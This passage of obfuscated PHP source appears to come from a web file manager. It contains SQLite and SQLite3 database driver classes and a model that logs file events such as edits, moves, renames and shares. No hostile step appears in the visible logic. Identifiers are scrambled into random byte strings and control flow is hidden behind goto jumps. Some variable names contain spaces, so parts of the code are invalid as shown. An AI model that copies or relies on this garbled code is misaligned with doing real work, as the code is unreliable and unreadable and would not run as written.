extract($this->values); require $this->tpl . $CÂÂ’ÄˆÑ; } } class DbSqliteBase extends Db { public function __construct($Fö“ÈÎÅ… = '') { $a£øğœÖæ¡ =& $_SERVER[¼]; if (!extension_loaded($a£øğœÖæ¡[9])) { think_exception(think_lang($a£øğœÖæ¡[10]) . $a£øğœÖæ¡[11]); } if (!empty($Fö“ÈÎÅ…)) { if (!isset($Fö“ÈÎÅ…[$a£øğœÖæ¡[12]])) { $Fö“ÈÎÅ…[$a£øğœÖæ¡[12]] = 438; } $this->config = $Fö“ÈÎÅ…; if (empty($this->config[$a£øğœÖæ¡[13]])) { $this->config[$a£øğœÖæ¡[13]] = array(); } } } public function connect($BÂ¬ô’ŒÍ = '', $cåÇÇ‡ƒÆÔ = 0) { $bÏé½ç©¸å =& $_SERVER[¼]; if (!isset($this->linkID[$cåÇÇ‡ƒÆÔ])) { goto d“–ŒòÊŞš; bÛ’Šˆôï: $this->linkID[$cåÇÇ‡ƒÆÔ] = $B©’¶ù§ò÷($BÂ¬ô’ŒÍ[$bÏé½ç©¸å[17]], $BÂ¬ô’ŒÍ[$bÏé½ç©¸å[12]]); if (!$this->linkID[$cåÇÇ‡ƒÆÔ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto fà¥ÕøÑªé; d“–ŒòÊŞš: if (empty($BÂ¬ô’ŒÍ)) { $BÂ¬ô’ŒÍ = $this->config; } $eÄÜ–÷Ã–Š = !empty($BÂ¬ô’ŒÍ[$bÏé½ç©¸å[13]][$bÏé½ç©¸å[14]]) ? $BÂ¬ô’ŒÍ[$bÏé½ç©¸å[13]][$bÏé½ç©¸å[14]] : $this->pconnect; $B©’¶ù§ò÷ = $eÄÜ–÷Ã–Š ? $bÏé½ç©¸å[15] : $bÏé½ç©¸å[16]; goto bÛ’Šˆôï; fà¥ÕøÑªé: @sqlite_busy_timeout($this->linkID[$cåÇÇ‡ƒÆÔ], 30000); if (1 != think_config($bÏé½ç©¸å[18])) { unset($this->config); } goto Fíä˜²ÂŸ’; Fíä˜²ÂŸ’: } return $this->linkID[$cåÇÇ‡ƒÆÔ]; } public function free() { $this->queryID = null; } public function query($D óƒ“‹Üõ) { goto EÔøÏÜ©­À; EÔøÏÜ©­À: $EªÃîšŠ¤· =& $_SERVER[¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dåå§óˆÔê; dåå§óˆÔê: $this->queryStr = $D óƒ“‹Üõ; if ($this->queryID) { $this->free(); } think_action_status($EªÃîšŠ¤·[19], 1); goto cçœÅ‡‹é; EñÇÎÛ¶Ö: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $D¿ˆŞÀ¿—Á = $this->getAll(); return $D¿ˆŞÀ¿—Á; } goto B±ËèËáÍŠ; cçœÅ‡‹é: think_status($EªÃîšŠ¤·[20]); $this->queryID = sqlite_query($this->_linkID, $D óƒ“‹Üõ); $this->debug(); goto EñÇÎÛ¶Ö; B±ËèËáÍŠ: } public function execute($c÷Ä¨ï‡‹) { goto c®Šñ‡œè; c®Šñ‡œè: $cÅ«‚ãœß“ =& $_SERVER[¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto a³Ï˜°¡ø; eË’À¯½: think_status($cÅ«‚ãœß“[20]); $D„‚ßä†Ñ = sqlite_exec($this->_linkID, $c÷Ä¨ï‡‹); $this->debug(); goto c»ºÌ×¥É‡; a³Ï˜°¡ø: $this->queryStr = $c÷Ä¨ï‡‹; if ($this->queryID) { $this->free(); } think_action_status($cÅ«‚ãœß“[21], 1); goto eË’À¯½; c»ºÌ×¥É‡: if (!1 === $D„‚ßä†Ñ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto d»À½ÃÌÉ°; d»À½ÃÌÉ°: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¼][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eÜáôæ…èÏ = sqlite_query($this->_linkID, $_SERVER[¼][23]); if (!$eÜáôæ…èÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $DÎ¼ÎÑÈ©ó = sqlite_query($this->_linkID, $_SERVER[¼][24]); if (!$DÎ¼ÎÑÈ©ó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $cƒÈ³‹á› = array(); if ($this->numRows > 0) { for ($A²¿ÇÔï§® = 0; $A²¿ÇÔï§® < $this->numRows; $A²¿ÇÔï§®++) { $cƒÈ³‹á›[$A²¿ÇÔï§®] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $cƒÈ³‹á›; } public function getFields($B¨’ÛºŒ…±) { $EŒô¶‰ =& $_SERVER[¼]; $aÈ¼¢’¾Öù = $this->query($EŒô¶‰[25] . $B¨’ÛºŒ…± . $EŒô¶‰[26]); $fËƒÎÂ¼££ = array(); if ($aÈ¼¢’¾Öù) { foreach ($aÈ¼¢’¾Öù as $FÜ’Ê…·Éİ => $EÜë‚¡¦¤) { $fËƒÎÂ¼££[$EÜë‚¡¦¤[$EŒô¶‰[27]]] = array($EŒô¶‰[28] => $EÜë‚¡¦¤[$EŒô¶‰[27]], $EŒô¶‰[29] => $EÜë‚¡¦¤[$EŒô¶‰[30]], $EŒô¶‰[31] => (bool) ($EÜë‚¡¦¤[$EŒô¶‰[32]] === $EŒô¶‰[33]), $EŒô¶‰[34] => $EÜë‚¡¦¤[$EŒô¶‰[35]], $EŒô¶‰[36] => strtolower($EÜë‚¡¦¤[$EŒô¶‰[37]]) == $EŒô¶‰[38], $EŒô¶‰[39] => strtolower($EÜë‚¡¦¤[$EŒô¶‰[40]]) == $EŒô¶‰[41]); } } return $fËƒÎÂ¼££; } public function getTables($b¶§å½ = '') { $a§Ã”›ø°‰ =& $_SERVER[¼]; $f¦¦Š†‡æˆ = $this->query($a§Ã”›ø°‰[42] . $a§Ã”›ø°‰[43] . $a§Ã”›ø°‰[44]); $CÕÍšŸ†àŒ = array(); foreach ($f¦¦Š†‡æˆ as $EÀ®—¨¾¹ => $eö¶ŠÇ³£ï) { $CÕÍšŸ†àŒ[$EÀ®—¨¾¹] = current($eö¶ŠÇ³£ï); } return $CÕÍšŸ†àŒ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $f‚Ää‰…·Œ =& $_SERVER[¼]; $c¶áÅß‘ÂÁ = sqlite_last_error($this->_linkID); $this->error = $c¶áÅß‘ÂÁ . $f‚Ää‰…·Œ[4] . sqlite_error_string($c¶áÅß‘ÂÁ); if ($f‚Ää‰…·Œ[33] != $this->queryStr) { $this->error .= LNG($f‚Ää‰…·Œ[45]) . $this->queryStr; } think_trace($this->error, $f‚Ää‰…·Œ[33], $f‚Ää‰…·Œ[46]); return $this->error; } public function escapeString($aö³«§îšË) { return sqlite_escape_string($aö³«§îšË); } public function parseLimit($FÓòÙÑòØ) { $a‚°óÕ´Šä =& $_SERVER[¼]; $EùÕˆí‹ì = $a‚°óÕ´Šä[33]; if (!empty($FÓòÙÑòØ)) { $FÓòÙÑòØ = explode($a‚°óÕ´Šä[47], $FÓòÙÑòØ); if (count($FÓòÙÑòØ) > 1) { $EùÕˆí‹ì .= $a‚°óÕ´Šä[48] . $FÓòÙÑòØ[1] . $a‚°óÕ´Šä[49] . $FÓòÙÑòØ[0] . $a‚°óÕ´Šä[50]; } else { $EùÕˆí‹ì .= $a‚°óÕ´Šä[48] . $FÓòÙÑòØ[0] . $a‚°óÕ´Šä[50]; } } return $EùÕˆí‹ì; } } class DbSqlite3Base extends Db { public function __construct($bô”ÂÏµ„ = '') { $Eï¶µÓ¡‰ =& $_SERVER[¼]; if (!class_exists($Eï¶µÓ¡‰[51])) { think_exception(think_lang($Eï¶µÓ¡‰[10]) . $Eï¶µÓ¡‰[52]); } if (!empty($bô”ÂÏµ„)) { if (!isset($bô”ÂÏµ„[$Eï¶µÓ¡‰[12]])) { $bô”ÂÏµ„[$Eï¶µÓ¡‰[12]] = 438; } $this->config = $bô”ÂÏµ„; if (empty($this->config[$Eï¶µÓ¡‰[13]])) { $this->config[$Eï¶µÓ¡‰[13]] = array(); } } } public function connect($BŸïÄƒÃâî = '', $D¡„­¯ö´î = 0) { $bø²„‚İ¡º =& $_SERVER[¼]; if (!isset($this->linkID[$D¡„­¯ö´î])) { if (empty($BŸïÄƒÃâî)) { $BŸïÄƒÃâî = $this->config; } $this->linkID[$D¡„­¯ö´î] = new SQLite3($BŸïÄƒÃâî[$bø²„‚İ¡º[17]]); if (!$this->linkID[$D¡„­¯ö´î]) { think_exception($this->linkID[$D¡„­¯ö´î]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D¡„­¯ö´î]->busyTimeout(30000); if (1 != think_config($bø²„‚İ¡º[18])) { unset($this->config); } } return $this->linkID[$D¡„­¯ö´î]; } public function free() { $this->queryID = null; } public function query($Aë“¹†ÂÅË) { goto bŒæ—öí¥¸; dÂ¬ÈˆªÏ»: think_status($C¸Ó·µÊ³Ã[20]); $this->queryID = $this->_linkID->query($Aë“¹†ÂÅË); $this->debug(); goto cùîºŠôíò; bŒæ—öí¥¸: $C¸Ó·µÊ³Ã =& $_SERVER[¼]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AÙšÜØ×; AÙšÜØ×: $this->queryStr = $Aë“¹†ÂÅË; if ($this->queryID) { $this->free(); } think_action_status($C¸Ó·µÊ³Ã[19], 1); goto dÂ¬ÈˆªÏ»; cùîºŠôíò: if (!1 === $this->queryID) { $this->error(); return !1; } else { $AæÆÍÎ±½š = $this->getAll(); $this->numRows = count($AæÆÍÎ±½š); return $AæÆÍÎ±½š; } goto C‚æ»ÊŠØè; C‚æ»ÊŠØè: } public function execute($F©î¹ØÜ£¸) { goto FäøÁËˆÁ; eŠœØ­ìöé: think_status($C‘Èùì£õŒ[20]); $BšÀÂÆ¯šã = $this->_linkID->exec($F©î¹ØÜ£¸); $this->debug(); goto C°ÅŒÇ‘; C°ÅŒÇ‘: if (!1 === $BšÀÂÆ¯šã) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto c‘×£â™Ä³; CôÇ¸›§›: $this->queryStr = $F©î¹ØÜ£¸; if ($this->queryID) { $this->free(); } think_action_status($C‘Èùì£õŒ[21], 1); goto eŠœØ­ìöé; FäøÁËˆÁ: $C‘Èùì£õŒ =& $_SERVER[¼]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CôÇ¸›§›; c‘×£â™Ä³: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¼][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÚ­‡¯…‘â = $this->_linkID->query($_SERVER[¼][23]); if (!$BÚ­‡¯…‘â) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÊÕÙõôï = $this->_linkID->query($_SERVER[¼][24]); if (!$FÊÕÙõôï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eê•šöçäÌ = array(); while ($FÕõœ¾ÍÂÛ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $eê•šöçäÌ[] = $FÕõœ¾ÍÂÛ; } $this->queryID->reset(); return $eê•šöçäÌ; } public function getFields($C±³×†Ø¡×) { $f¨’Ó½–…¦ =& $_SERVER[¼]; $C÷è£Ù¾ç = $this->query($f¨’Ó½–…¦[25] . $C±³×†Ø¡× . $f¨’Ó½–…¦[26]); $céÒ²àëï = array(); if ($C÷è£Ù¾ç) { foreach ($C÷è£Ù¾ç as $bŸî—ï¾ğ => $AÀ¶‡¹¿Ù·) { $céÒ²àëï[$AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[28]]] = array($f¨’Ó½–…¦[28] => $AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[28]], $f¨’Ó½–…¦[29] => $AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[29]], $f¨’Ó½–…¦[31] => (bool) ($AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[31]] === $f¨’Ó½–…¦[33]), $f¨’Ó½–…¦[34] => $AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[53]], $f¨’Ó½–…¦[36] => (bool) $AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[54]], $f¨’Ó½–…¦[39] => (bool) $AÀ¶‡¹¿Ù·[$f¨’Ó½–…¦[54]]); } } return $céÒ²àëï; } public function getTables($eÎñ¾Ê«Û = '') { $b³ÕäƒÛ—§ =& $_SERVER[¼]; $c¿Û‹Å…ÂÄ = $this->query($b³ÕäƒÛ—§[42] . $b³ÕäƒÛ—§[43] . $b³ÕäƒÛ—§[44]); $E•ñÀÎè¯ = array(); foreach ($c¿Û‹Å…ÂÄ as $E£îï¢³„ => $c†‰ˆá©ƒÎ) { $E•ñÀÎè¯[$E£îï¢³„] = current($c†‰ˆá©ƒÎ); } return $E•ñÀÎè¯; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fÍô‰â† =& $_SERVER[¼]; $this->error = $this->_linkID->lastErrorMsg(); if ($fÍô‰â†[33] != $this->queryStr) { $this->error .= LNG($fÍô‰â†[45]) . $this->queryStr; } think_trace($this->error, $fÍô‰â†[33], $fÍô‰â†[46]); return $this->error; } public function escapeString($d™¡áŸ©ù£) { $bÀíìŞ¥ » =& $_SERVER[¼]; if ($this->_linkID) { return $this->_linkID->escapeString($d™¡áŸ©ù£); } return str_ireplace($bÀíìŞ¥ »[55], $bÀíìŞ¥ »[56], $d™¡áŸ©ù£); } public function parseLimit($Bóºô‡Ãâ) { $B²µ¥š·Ğ =& $_SERVER[¼]; $fĞÀí”å« = $B²µ¥š·Ğ[33]; if (!empty($Bóºô‡Ãâ)) { $Bóºô‡Ãâ = explode($B²µ¥š·Ğ[47], $Bóºô‡Ãâ); if (count($Bóºô‡Ãâ) > 1) { $fĞÀí”å« .= $B²µ¥š·Ğ[48] . $Bóºô‡Ãâ[1] . $B²µ¥š·Ğ[49] . $Bóºô‡Ãâ[0] . $B²µ¥š·Ğ[50]; } else { $fĞÀí”å« .= $B²µ¥š·Ğ[48] . $Bóºô‡Ãâ[0] . $B²µ¥š·Ğ[50]; } } return $fĞÀí”å«; } } goto C³‹¼¶¬›Ñ; d‘²¯á¯Š: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\x63\x65\x5f\x65\166\x65\x6e\164"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\151\155\145", "\x74\151\x6d\145", "\x69\156\x73\x65\162\x74", "\x66\x75\156\x63\164\x69\157\x6e"), array("\144\145\163\143", '', "\151\156\x73\x65\x72\x74\54\x75\160\144\141\164\x65\x2c\163\145\154\x65\143\164", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($bµİËÀ…î, $F‹Ääª©ãª, $eí Ö×µ÷œ = '') { goto D¿İáŠ¡ ¶; D¿İáŠ¡ ¶: $CÌ¾ ±ÆóÁ =& $_SERVER[¼]; if (!$this->eventSave) { return; } $e‚¾éóÎ ° = Model($CÌ¾ ±ÆóÁ[1103])->sourceInfo($bµİËÀ…î); goto EôÚ“ğÕ; fÛ³¸©ğèÀ: $dÛéÉ‡è­è = array($CÌ¾ ±ÆóÁ[380] => $bµİËÀ…î, $CÌ¾ ±ÆóÁ[2232] => $e‚¾éóÎ °[$CÌ¾ ±ÆóÁ[457]], $CÌ¾ ±ÆóÁ[2233] => $e‚¾éóÎ °[$CÌ¾ ±ÆóÁ[28]], $CÌ¾ ±ÆóÁ[462] => $e‚¾éóÎ °[$CÌ¾ ±ÆóÁ[462]], $CÌ¾ ±ÆóÁ[1395] => USER_ID, $CÌ¾ ±ÆóÁ[385] => $F‹Ääª©ãª, $CÌ¾ ±ÆóÁ[1397] => $eí Ö×µ÷œ); $this->addSystemLog($F‹Ääª©ãª, $dÛéÉ‡è­è); return $this->add($dÛéÉ‡è­è); goto BÌô„Êâ‘’; EôÚ“ğÕ: if (!$e‚¾éóÎ °) { return !1; } if ($this->isCacheEvent($e‚¾éóÎ °, $F‹Ääª©ãª)) { return; } if ($eí Ö×µ÷œ && is_string($eí Ö×µ÷œ)) { $eí Ö×µ÷œ = array($CÌ¾ ±ÆóÁ[2097] => $eí Ö×µ÷œ); } goto fÛ³¸©ğèÀ; BÌô„Êâ‘’: } private function addSystemLog($FÔôÌ ù‘, $b¶ØÚ›Œ) { $B¬®ŠÁİÀ =& $_SERVER[¼]; if ($FÔôÌ ù‘ == $B¬®ŠÁİÀ[2234]) { $FÔôÌ ù‘ = $b¶ØÚ›Œ[$B¬®ŠÁİÀ[401]][$B¬®ŠÁİÀ[2235]]; } else { if (in_array($FÔôÌ ù‘, array($B¬®ŠÁİÀ[2044], $B¬®ŠÁİÀ[2236]))) { $FÔôÌ ù‘ = $b¶ØÚ›Œ[$B¬®ŠÁİÀ[401]][$B¬®ŠÁİÀ[684]]; } } $BÕùåê‹£ô = array_merge($b¶ØÚ›Œ, array($B¬®ŠÁİÀ[2237] => $b¶ØÚ›Œ[$B¬®ŠÁİÀ[366]], $B¬®ŠÁİÀ[2238] => $b¶ØÚ›Œ[$B¬®ŠÁİÀ[2238]])); Model($B¬®ŠÁİÀ[2008])->addLog($B¬®ŠÁİÀ[2239] . $FÔôÌ ù‘, $BÕùåê‹£ô); } private function isCacheEvent($c†ÕÊñŠÓ´, $A¾í¦¤±˜¼) { if ($c†ÕÊñŠÓ´[$_SERVER[¼][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($f“‚ª…§³×, $b·»¼† ¼) { $D¬¬ã”Ô´Ÿ =& $_SERVER[¼]; $eĞƒíÕ‹¹ = Model($D¬¬ã”Ô´Ÿ[1103])->sourceInfo($f“‚ª…§³×); $aíÜ¶Ÿ¤Ê = array($D¬¬ã”Ô´Ÿ[2235] => $b·»¼† ¼, $D¬¬ã”Ô´Ÿ[28] => $eĞƒíÕ‹¹[$D¬¬ã”Ô´Ÿ[28]]); return $this->addEvent($f“‚ª…§³×, $D¬¬ã”Ô´Ÿ[2234], $aíÜ¶Ÿ¤Ê); } public function eventFileEdit($böÉ¦°àÚ‰) { $D¸çÊ¼ìê =& $_SERVER[¼]; $E‡ÉÎ¸ˆ = array($D¸çÊ¼ìê[2240] => $_SERVER[$D¸çÊ¼ìê[2241]], $D¸çÊ¼ìê[1714] => strtolower(ACTION)); return $this->addEvent($böÉ¦°àÚ‰, $D¸çÊ¼ìê[2035], $E‡ÉÎ¸ˆ); } public function eventRecycle($eã¿’êÚÀ, $D‘¹Ò’Şè) { return $this->addEvent($eã¿’êÚÀ, $_SERVER[¼][2236], $D‘¹Ò’Şè); } public function eventRemove($f øæ™¾Ù÷) { $DÕíÇó³‘ =& $_SERVER[¼]; $DÑÑêœæ¿± = Model($DÕíÇó³‘[1103])->sourceInfo($f øæ™¾Ù÷); $dáÔ¶·©ä² = $DÑÑêœæ¿±[$DÕíÇó³‘[28]]; return $this->addEvent($DÑÑêœæ¿±[$DÕíÇó³‘[457]], $DÕíÇó³‘[2034], $dáÔ¶·©ä²); } public function eventShare($f…–™İÙÙï, $B’Ú¤à óç) { return $this->addEvent($f…–™İÙÙï, $_SERVER[¼][2044], $B’Ú¤à óç); } public function eventMove($B‹ î°à¯¼, $díÔÈ‘èƒ, $FÏ¢—Êİ“) { goto aß«—ËÁ¼Î; eº¢ĞØ»·Í: $this->addEvent($B‹ î°à¯¼, $C®›á¦ƒµŞ[488], $DŠ–ê‹˜°ä); $a¯ù£Ë§ªÅ = $dïƒ‚¶õ•§->sourceInfo($B‹ î°à¯¼); $DŠ–ê‹˜°ä = array($C®›á¦ƒµŞ[366] => $a¯ù£Ë§ªÅ[$C®›á¦ƒµŞ[366]], $C®›á¦ƒµŞ[28] => $a¯ù£Ë§ªÅ[$C®›á¦ƒµŞ[28]]); goto c……¨±ÃĞ; aß«—ËÁ¼Î: $C®›á¦ƒµŞ =& $_SERVER[¼]; $dïƒ‚¶õ•§ = Model($C®›á¦ƒµŞ[1103]); $a¯ù£Ë§ªÅ = $dïƒ‚¶õ•§->sourceInfo($B‹ î°à¯¼); goto f‡Áœî ‘¹; f‡Áœî ‘¹: $F¼·Ã¦Øçµ = $dïƒ‚¶õ•§->sourceInfo($díÔÈ‘èƒ); $fä‡Ú“ÚÜæ = $dïƒ‚¶õ•§->sourceInfo($FÏ¢—Êİ“); $DŠ–ê‹˜°ä = array($C®›á¦ƒµŞ[999] => $díÔÈ‘èƒ, $C®›á¦ƒµŞ[2242] => $F¼·Ã¦Øçµ[$C®›á¦ƒµŞ[28]], $C®›á¦ƒµŞ[2243] => $F¼·Ã¦Øçµ[$C®›á¦ƒµŞ[462]], $C®›á¦ƒµŞ[1000] => $FÏ¢—Êİ“, $C®›á¦ƒµŞ[2244] => $fä‡Ú“ÚÜæ[$C®›á¦ƒµŞ[28]], $C®›á¦ƒµŞ[2245] => $fä‡Ú“ÚÜæ[$C®›á¦ƒµŞ[462]]); goto eº¢ĞØ»·Í; c……¨±ÃĞ: $this->addEvent($díÔÈ‘èƒ, $C®›á¦ƒµŞ[2246], $DŠ–ê‹˜°ä); goto fÖ¿Š…‰ÂÚ; fÖ¿Š…‰ÂÚ: } public function eventCopy($F¬Ÿçñ¢œ) { $this->eventCreate($F¬Ÿçñ¢œ, $_SERVER[¼][486]); } public function eventRename($Fï¨±†“Ê, $DÓ™…ìˆ×, $b¯éÇÉÍÙ) { $bÈŒ°³È»Ø =& $_SERVER[¼]; $DŒÚ©í‡å» = array($bÈŒ°³È»Ø[999] => $DÓ™…ìˆ×, $bÈŒ°³È»Ø[1000] => $b¯éÇÉÍÙ); return $this->addEvent($Fï¨±†“Ê, $bÈŒ°³È»Ø[1115], $DŒÚ©í‡å»); } public function eventAddComment($AŸ«Íáğ, $C“ŞÕÃŒß¡) { return $this->addEvent($AŸ«Íáğ, $_SERVER[¼][2247], $C“ŞÕÃŒß¡); } public function eventAddDesc($AË‹æ„—¼„, $c¿˜Ã×â«) { return $this->addEvent($AË‹æ„—¼„, $_SERVER[¼][2248], $c¿˜Ã×â«); } public function listBySource($E§‡Ûª±Ö¶) { goto Aâ¾–¯õ¨¥; Aâ¾–¯õ¨¥: $CÍ§İÛÓµ¨ =& $_SERVER[¼]; $b£½÷›Ò‘ò = Model($CÍ§İÛÓµ¨[1103])->sourceInfo($E§‡Ûª±Ö¶); $FÁ‡½à°‰¿ = array($CÍ§İÛÓµ¨[380] => $E§‡Ûª±Ö¶); goto Aº»„ªïÉ”; Aº»„ªïÉ”: if ($b£½÷›Ò‘ò[$CÍ§İÛÓµ¨[367]] == $CÍ§İÛÓµ¨[83]) { $FèÆÀºÆ« = Model($CÍ§İÛÓµ¨[1103])->listSearchChildren($E§‡Ûª±Ö¶, 20000); $FèÆÀºÆ«[] = $E§‡Ûª±Ö¶ . $CÍ§İÛÓµ¨[358]; $FÁ‡½à°‰¿ = array($CÍ§İÛÓµ¨[366] => array($CÍ§İÛÓµ¨[7], $FèÆÀºÆ«)); } $fñ¢²Õ·Ú» = $this->where($FÁ‡½à°‰¿)->order($CÍ§İÛÓµ¨[2249])->selectPage(); if ($fñ¢²Õ·Ú»[$CÍ§İÛÓµ¨[348]][$CÍ§İÛÓµ¨[349]] == 0) { $fñ¢²Õ·Ú»[$CÍ§İÛÓµ¨[348]][$CÍ§İÛÓµ¨[349]] = 1; $fñ¢²Õ·Ú»[$CÍ§İÛÓµ¨[351]] = array(array($CÍ§İÛÓµ¨[380] => $E§‡Ûª±Ö¶, $CÍ§İÛÓµ¨[2232] => $b£½÷›Ò‘ò[$CÍ§İÛÓµ¨[457]], $CÍ§İÛÓµ¨[1395] => $b£½÷›Ò‘ò[$CÍ§İÛÓµ¨[375]], $CÍ§İÛÓµ¨[385] => $CÍ§İÛÓµ¨[2250], $CÍ§İÛÓµ¨[386] => $b£½÷›Ò‘ò[$CÍ§İÛÓµ¨[184]], $CÍ§İÛÓµ¨[1397] => $CÍ§İÛÓµ¨[33])); } goto f¢ñƒ®¯¾Ü; f¢ñƒ®¯¾Ü: $fñ¢²Õ·Ú» = $this->eventListParse($fñ¢²Õ·Ú», $E§‡Ûª±Ö¶); show_json($fñ¢²Õ·Ú»); goto f‰Àˆ¡ÇÛ; f‰Àˆ¡ÇÛ: } private function eventListParse($b‚œ…ÍÜ¶±, $FÂ®ÔöàâÌ) { goto E îÓ¡šİ; a£Ä»±­„: $cÈÌ¼Õ˜¸Ş = array_unique($cÈÌ¼Õ˜¸Ş); $E™áàÏ‚„” = array_unique(array_to_keyvalue($C÷ÌÆô·³, $b–”Ôèğ°Ü[33], $b–”Ôèğ°Ü[1404])); $F•…ùÁ²ÅÜ = Model($b–”Ôèğ°Ü[473])->userListInfo($E™áàÏ‚„”); goto aÔ‰Ø‘¦¿; aÔ‰Ø‘¦¿: $aã²†¯ò£ = Model($b–”Ôèğ°Ü[744])->sourceListInfo($cÈÌ¼Õ˜¸Ş, !0); foreach ($C÷ÌÆô·³ as &$AÅìğ¿Ùùæ) { if ($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[29]] == $b–”Ôèğ°Ü[488] && isset($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[999]])) { $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[999]] = $aã²†¯ò£[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[999]]]; $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[1000]] = $aã²†¯ò£[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[1000]]]; } if ($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[29]] == $b–”Ôèğ°Ü[2246] && isset($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[366]])) { $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[366]] = $aã²†¯ò£[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]][$b–”Ôèğ°Ü[366]]]; } $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[388]] = $aã²†¯ò£[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[366]]]; $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2251]] = $aã²†¯ò£[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2238]]]; if ($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[29]] == $b–”Ôèğ°Ü[2034]) { $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2251]] = $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[388]]; $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2238]] = $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2251]][$b–”Ôèğ°Ü[366]]; $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[388]] = !1; $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[366]] = $b–”Ôèğ°Ü[33]; } $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[2204]] = $F•…ùÁ²ÅÜ[$AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[1404]]]; } $b‚œ…ÍÜ¶±[$b–”Ôèğ°Ü[351]] = $C÷ÌÆô·³; goto f¤¹÷„Ø¡‚; E îÓ¡šİ: $b–”Ôèğ°Ü =& $_SERVER[¼]; $C÷ÌÆô·³ = $b‚œ…ÍÜ¶±[$b–”Ôèğ°Ü[351]]; $cÈÌ¼Õ˜¸Ş = array_to_keyvalue($C÷ÌÆô·³, $b–”Ôèğ°Ü[33], $b–”Ôèğ°Ü[366]); goto bññšÎç´Ä; f¤¹÷„Ø¡‚: return $b‚œ…ÍÜ¶±; goto CĞŞóâ‹Œ; bññšÎç´Ä: $dØô´Çò = array_to_keyvalue($C÷ÌÆô·³, $b–”Ôèğ°Ü[33], $b–”Ôèğ°Ü[2238]); foreach ($C÷ÌÆô·³ as $AÅìğ¿Ùùæ) { $b¶Ô½…âİ = $AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[401]]; if ($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[29]] == $b–”Ôèğ°Ü[488] && isset($b¶Ô½…âİ[$b–”Ôèğ°Ü[999]])) { $cÈÌ¼Õ˜¸Ş[] = $b¶Ô½…âİ[$b–”Ôèğ°Ü[999]] . $b–”Ôèğ°Ü[33]; $cÈÌ¼Õ˜¸Ş[] = $b¶Ô½…âİ[$b–”Ôèğ°Ü[1000]] . $b–”Ôèğ°Ü[33]; } if ($AÅìğ¿Ùùæ[$b–”Ôèğ°Ü[29]] == $b–”Ôèğ°Ü[2246] && isset($b¶Ô½…âİ[$b–”Ôèğ°Ü[366]])) { $cÈÌ¼Õ˜¸Ş[] = $b¶Ô½…âİ[$b–”Ôèğ°Ü[366]] . $b–”Ôèğ°Ü[33]; } } $cÈÌ¼Õ˜¸Ş = array_merge($cÈÌ¼Õ˜¸Ş, $dØô´Çò, array($FÂ®ÔöàâÌ . $b–”Ôèğ°Ü[33])); goto a£Ä»±­„; 